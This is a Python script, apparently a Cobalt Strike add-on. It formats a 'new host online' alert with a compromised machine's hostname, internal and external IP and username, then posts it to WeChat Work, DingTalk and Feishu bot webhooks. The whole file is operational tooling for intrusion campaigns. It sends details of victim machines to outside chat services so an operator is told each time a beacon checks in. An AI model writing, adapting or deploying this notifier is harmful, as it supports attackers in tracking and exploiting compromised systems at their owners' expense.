# encoding:utf-8
import argparse
import requests
import random
import string
import json

# 企业微信机械人
def wechat_bot(news,wechat_bot_key):
    session = requests.Session()
    paramsGet = {"key":wechat_bot_key}
    rawBody = {"touser":"UserID1|UserID2|UserID3","toparty":"PartyID1|PartyID2","totag":"TagID1|TagID2","msgtype":"text","agentid":1,"text":{"content":news},"safe":0,"enable_id_trans":0,"enable_duplicate_check":0,"duplicate_check_interval":1800}
    rawBody = json.dumps(rawBody)
    response = session.post("https://qyapi.weixin.qq.com/cgi-bin/webhook/send", data=rawBody, params=paramsGet)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)
# 飞书机械人
def feishu_bot(news,feishu_bot_key):
    session = requests.Session()
    rawBody = {"msg_type": "text", "content": {"text": news}}
    rawBody = json.dumps(rawBody)
    response = session.post("https://open.feishu.cn/open-apis/bot/v2/hook/%s"%feishu_bot_key, data=rawBody)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)

# 钉钉机械人
def dindin_bot(news,dindin_bot_key):
    session = requests.Session()

    paramsGet = {"access_token":dindin_bot_key}
    rawBody = {"msgtype": "text","text": {"content":news}}
    # 把字典转换为json
    rawBody = json.dumps(rawBody)
    headers = {"Content-Type":"application/json"}
    response = session.post("https://oapi.dingtalk.com/robot/send", data=rawBody, params=paramsGet, headers=headers)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)

# 信息分析
def cs_xx():
    parser = argparse.ArgumentParser(description='Beacon Info')
    parser.add_argument('--computername')
    parser.add_argument('--internalip')
    parser.add_argument('--externalip')
    parser.add_argument('--username')
    args = parser.parse_args()

    internalip = args.internalip
    externalip = args.externalip
    computername = args.computername
    username = args.username
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

    content = """CobaltStrike 上线提醒\n ━━━━━━☠️─────── \n您有新主机上线啦 ！\n主机名：{}\n内部IP：{}\n外部IP：cip.cc/{}\n用户名：{}\nToken：{}\n请注意查收哦 ~\n ━━━━━━☠️─────── """.format(computername, internalip, externalip, username, ran_str)
    return content

if __name__ == "__main__":
    content = cs_xx()
    # 微信机械人提醒
    wechat_bot_key = "xxxx"
    wechat_bot(content,wechat_bot_key)
    # 钉钉机械人提醒
    dindin_bot_key = "xxxx"
    dindin_bot(content,dindin_bot_key)
    # 飞书机械人提醒
    feishu_bot_key = "xxxx"
    feishu_bot(content,feishu_bot_key)